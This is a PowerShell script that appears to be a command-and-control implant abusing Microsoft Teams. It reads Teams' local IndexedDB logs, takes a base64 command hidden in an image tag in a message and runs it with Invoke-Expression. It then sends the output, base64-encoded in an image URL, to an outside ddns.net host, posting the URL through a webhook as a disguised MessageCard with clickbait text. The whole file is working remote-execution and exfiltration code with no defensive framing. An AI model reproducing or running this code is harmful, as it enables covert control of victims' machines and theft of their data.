$importPath = "C:\Users\bobbyrauch\AppData\Roaming\Microsoft\Teams\IndexedDB\https_teams.microsoft.com_0.indexeddb.leveldb\*.log"


$originalendpoint = 'http://bobbyrsec.ddns.net:80/.gif'

while ($true) {

$firstString = "paving<img alt=`"Red Lold`" src=`"data:image/png;base64, "
$secondString = "`" />roads"

$text = Get-Content $importPath

#Sample pattern
$pattern = "(?<=$firstString).*?(?=$secondString)"

$output = [regex]::Matches($text,$pattern).value
$output = $output -replace '\s',''
$output -is [array]
$b = $output[$output.Length-2]
echo $b.GetType()
$b = $b.Trim()
$b = $b -replace '[^a-zA-Z0-9`++`/+`=+`.+]', ''
$DecodedText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b))
echo $DecodedText

$DecodedText2 = $DecodedText.Substring($DecodedText.IndexOf("`;hello;")+7)
echo $DecodedText2



If ($DecodedText2 -ne 'start') {


$cmdOutput = Invoke-Expression $DecodedText2 | Out-String


$cmdOutput = $cmdOutput.ToString()
echo $cmdOutput


$encodedBytes = [System.Text.Encoding]::UTF8.GetBytes($cmdOutput)
$encodedText = [System.Convert]::ToBase64String($encodedBytes)
echo $encodedText
$gifendpoint = "http://bobbyrsec.ddns.net:80/"+$encodedText+".gif"

$gifendpoint

If ($originalendpoint -ne $gifendpoint) {

echo "MADE IT"

$originalendpoint = $gifendpoint

echo $originalendpoint
echo $gifendpoint

$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Content-Type", "application/json")

$body = "{`n	`"@type`": `"MessageCard`",`n	`"@context`": `"https://schema.org/extensions`",`n	`"summary`": `"2 new Yammer posts`",`n	`"themeColor`": `"0078D7`",`n	`"sections`": [`n		{`n			`"activityImage`":`""+ $gifendpoint + "`",`n			`"activityTitle`": `"Chase Miller`",`n			`"activitySubtitle`": `"2 hours ago - 3 comments`",`n			`"facts`": [`n				{`n					`"name`": `"Keywords:`",`n					`"value`": `"Surface`"`n				},`n				{`n					`"name`": `"Group:`",`n					`"value`": `"Helpdesk Support`"`n				}`n			],`n			`"text`": `"Can You Solve the Math Problem That Is Baffling the Internet? More than 530,000 people were commenting on one single Facebook picture. Are you smart enough to figure it out?`",`n			`"potentialAction`": [`n				{`n					`"@type`": `"OpenUri`",`n					`"name`": `"View conversation`"`n				}`n			]`n		}`n		`n	]`n}"


echo $body
$response = Invoke-RestMethod 'https://bobbyrsectest.webhook.office.com/webhookb2/bc51c234-1bdb-4136-8d0c-a391bdff5a82@656d3e19-4c3c-48cb-957b-b5bce1cb7bc0/IncomingWebhook/36708044a98d44c7a25ce78315f7a09b/9e02156d-981c-4a84-b2bf-0c5cc1382b8c' -Method 'POST' -Headers $headers -Body $body
$response | ConvertTo-Json


}
}
}
